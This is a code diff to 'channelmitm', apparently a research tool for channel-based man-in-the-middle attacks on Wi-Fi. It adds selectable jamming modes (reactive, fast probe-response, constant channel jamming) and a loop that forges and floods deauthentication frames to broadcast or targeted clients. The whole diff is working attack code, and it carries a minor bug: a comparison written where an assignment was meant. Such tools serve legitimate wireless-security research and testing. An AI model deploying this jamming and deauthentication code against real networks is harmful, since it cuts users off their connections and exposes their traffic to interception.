@@ -71,6 +71,20 @@ enum dbg_level {
 
 // Jamming the beacons means ALL stations will connect through us.
 // Jamming probe requests/responses allows use to individually target stations.
+enum jam_methods {
+	/** Jams the beacons of the targeted AP. Is the default. */
+	REACTIVE,
+	/** Continoues jamming of the channel the AP is operating on.
+	 * Very disruptive (jams pretty much every channel, not just one).
+	 * Is not implemented in the public firmware
+	 */
+	CONSTANT,
+	/** Technically doesn't jam anything. It replies to probe requests very quickly
+	 * by sending probe responses with our cloned channel set.
+	 * Useful for targeting individual clients.
+	 */
+	FASTREPLY
+};
 
 // Use Cases:
 // - Transparent repeater (original AP still sees all connected clients)
@@ -88,12 +102,14 @@ char usage[] =
 "  Attack options:\n"
 "\n"
 "      -a interface : Wireless interface on the channel of AP the attack/clone\n"
+"      -n channel   : The channel the AP is operating on. Can be 1-11. In some countries 1-13\n"
 "      -c interface : Wireless interface on which to clone the AP\n"
 "      -s ssid      : SSID of the Access Point (AP) to clone\n"
 "\n"
 "  Optional parameters:\n"
 "\n"
 "      -j interace  : Interface used to jam the targeted AP\n"
+"      -m jammethod : [reactive|fastreply|constant] Select method for jamming. Default: reactive\n"
 "      --dual       : Attack two clients simultaneously\n"
 "      -x interval  : Inject chopchop'ed packet every given milliseconds\n"
 "      -b bssid     : MAC address of target Access Point (AP) to clone\n"
@@ -135,6 +151,9 @@ struct options_t
 	/** Channel of AP */
 	int ap_channel;
 	
+	/** The method which is used for jamming*/
+	jam_methods jammethod;
+
 	/** when true assume both clients are MitM'ed and attack both */
 	bool simul;
 	/** when true it changes ssid name of the clone */
@@ -403,7 +422,7 @@ bool parseConsoleArgs(int argc, char *argv[])
 	memset(&opt, 0, sizeof(opt));
 	opt.chopint = 100; // inject 10 packets each second
 
-	while ((c = getopt_long(argc, argv, "a:c:s:j:b:p:d:x:n:thvKFS", long_options, &option_index)) != -1)
+	while ((c = getopt_long(argc, argv, "a:c:s:j:b:p:d:x:n:m:thvKFS", long_options, &option_index)) != -1)
 	{
 		switch (c)
 		{
@@ -422,6 +441,15 @@ bool parseConsoleArgs(int argc, char *argv[])
 
 		case 'j':
 			strncpy(opt.interface_jam, optarg, sizeof(opt.interface_jam));
+			break;
+
+		case 'm':
+			if (strcmp("fastreply", optarg) == 0)
+				opt.jammethod = FASTREPLY;
+			else if (strcmp("constant", optarg) == 0)
+				opt.jammethod = CONSTANT;
+			else
+				opt.jammethod == REACTIVE;
 			break;
 
 		case 'x':
@@ -500,6 +528,13 @@ bool parseConsoleArgs(int argc, char *argv[])
 	if (is_empty(opt.bssid, 6) && opt.ssid[0] == '\x0')
 	{
 		printf("You must specify either a target SSID (-s) or BSSID (-b).\n");
+		printf("\"channelmitm --help\" for help.\n");
+		return false;
+	}
+
+	if (opt.ap_channel < 1 || opt.ap_channel > 13)
+	{
+		printf("You must specify the channel (from 1-13)) the AP is operating on (-n).\n");
 		printf("\"channelmitm --help\" for help.\n");
 		return false;
 	}
@@ -1462,6 +1497,12 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 	printf("Cloned SSID:\t%s\n", opt.ssid);
 	printf("Cloned BSSID:\t%02X:%02X:%02X:%02X:%02X:%02X\n", opt.bssid[0], opt.bssid[1],
 		opt.bssid[2], opt.bssid[3], opt.bssid[4], opt.bssid[5]);
+	// If we deauth the clients, the MAC have to be set to the bssid.
+	if (global.jam)
+	{
+		osal_wi_set_mac(global.jam, opt.bssid);
+		osal_wi_set_macmask(global.jam, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF");
+	}
 
 #ifdef FIXED_CLIENT_LIST
 	uint8_t macmask[6];
@@ -1488,51 +1529,91 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 #endif
 
 	//
-	// 4. Start the fake AP and forward traffic
+	// 4. Start jamming and disconnect clients
+	//
+	if (global.jam) {
+		if (opt.jammethod != CONSTANT)
+		{
+			// Deauth clients
+			uint8_t buf[1024];
+			memset(buf, 0, sizeof(buf));
+			ieee80211header *hdr = (ieee80211header*) buf;
+			hdr->fc.type = 0;
+			hdr->fc.subtype = 12;
+#ifdef FIXED_CLIENT_LIST
+			// FIXME Generate a deauth packet for each client
+			memcpy(hdr->addr1, clientmac, 6);
+#else
+			memcpy(hdr->addr1, "\xff\xff\xff\xff\xff\xff", 6);
+#endif
+			memcpy(hdr->addr2, opt.bssid, 6);
+			memcpy(hdr->addr3, opt.bssid, 6);
+			hdr->sequence.seqnum = 0;
+			// FIXME Send dauth packets with the most current sequence number
+			// Otherwise the firmware panics sometimes
+			std::cout << "Dirty deauth clients" << std::endl;
+			int errc = 0;
+			for (int i=0; i<0x1ff; ++i)
+			{
+				// +2Bytes for deauth reason
+				if (osal_wi_write(global.jam, buf, sizeof(ieee80211header) + 2) < 0)
+				{
+					std::cerr <<  "Error sending deauth apckets" << std::endl;
+					++errc;
+					if (errc > 10)
+						break;
+				}
+				++hdr->sequence.seqnum; // Guessing
+			}
+		}
+		if (opt.jammethod == FASTREPLY)
+		{
+#if 0
+			// Add a channel switch announcement to the fastreply beacon.
+			uint8_t fastpkt[MAX_MSDU_BODY_SIZE];
+			size_t fastpktlen = global.proberesplen;
+
+			memcpy(fastpkt, global.proberesp, global.proberesplen);
+			beacon_set_chan(fastpkt, fastpktlen, osal_wi_getchannel(global.jam));
+			beacon_set_channel_switch(fastpkt, &fastpktlen, osal_wi_getchannel(clone));
+#endif
+			std::cout << "[" << currentTime() << "]  " << "Started fastreply" << std::endl;
+			if (osal_wi_fastreply_packet(global.jam, global.proberesp, global.proberesplen) < 0) {
+				fprintf(stderr, "Failed to set reply packet\n");
+				return -1;
+			}
+			// FIXME Replies only to one client. Reply to all clients or use this method if only one client should be mitm'd
+			std::thread jam_thread(fastreply, global.jam, clientmac);
+			jam_thread.detach();
+		}
+		else if (opt.jammethod == CONSTANT)
+		{
+			std::cout << "\n##### Constant jamming is not implemented in the public firmware! #####\n\n" <<\
+			"Constant jamming is not working reliably (and will disconnect devices on other channels as well!).\n" << \
+			"Use reactive jamming or fastreply if something doesn't work.\n" << std::endl;
+			std::cout << "[" << currentTime() << "]  " << "Started continuous jammer (cont jam)" << std::endl;
+			osal_wi_constantjam_start(global.jam);
+			global.isjamming = true;
+		}
+		else if (opt.jammethod == REACTIVE)
+		{
+			std::cout << "[" << currentTime() << "]  " << "Started reactive jammer" << std::endl;
+			std::thread jam_thread(reactivejam, global.jam, opt.bssid, 0);
+			jam_thread.detach();
+		}
+		else
+		{
+			std::cerr << "Not yet implemented jam method selected." << std::endl;
+			return -1;
+		}
+	}
+
+
+	//
+	// 5. Start the fake AP and forward traffic
 	//
 	tick.tv_sec = 0;
 	tick.tv_nsec = 10 * 1000 * 1000;
-
-	if (global.jam) {
-#ifdef FIXED_CLIENT_LIST
-		// Deauth client
-		uint8_t buf[1024];
-		memset(buf, 0, sizeof(buf));
-		ieee80211header *hdr = (ieee80211header*) buf;
-		hdr->fc.type = 0;
-		hdr->fc.subtype = 12;
-		memcpy(hdr->addr1, clientmac, 6); // Why can we deauth every client? o.O
-		memcpy(hdr->addr2, opt.bssid, 6);
-		memcpy(hdr->addr3, opt.bssid, 6);
-		hdr->sequence.seqnum = 0;
-		// FIXME Send probe request from breoadcast -> get multicast sequence number ->	deauth
-		std::cout << "Dirty deauth client" << std::endl;
-		for (int i=0; i<0xff; ++i)
-		{
-			// +2Bytes for deauth reason
-			if (osal_wi_write(ap, buf, sizeof(ieee80211header) + 2) < 0)
-				std::cerr <<  "Error sending deauth apckets" << std::endl;
-			++hdr->sequence.seqnum; // Guessing
-		}
-		
-		std::cout << "proberesolen = " << global.proberesplen << std::endl;
-		if (osal_wi_fastreply_packet(global.jam, global.proberesp, global.proberesplen) < 0) {
-			fprintf(stderr, "Failed to set reply packet\n");
-			return -1;
-		}
-
-		std::thread jam_thread(fastreply, global.jam, hdr->addr1);
-		jam_thread.detach();
-
-		/*std::cout << "THREAD: Jam beacons of " << opt.ssid << " for " << opt.seconds << "sec" << std::endl;
-		std::thread jam_thread(reactivejam, global.jam, opt.bssid, 0);
-		jam_thread.detach();*/
-#else		
-		std::cout << "[" << currentTime() << "]  " << "Started continuous jammer (cont jam)" << std::endl;
-		osal_wi_constantjam_start(global.jam);
-		global.isjamming = true;
-#endif
-	}
 
 	std::cout << "[" << currentTime() << "]  " << "Started attack!" << std::endl;
 
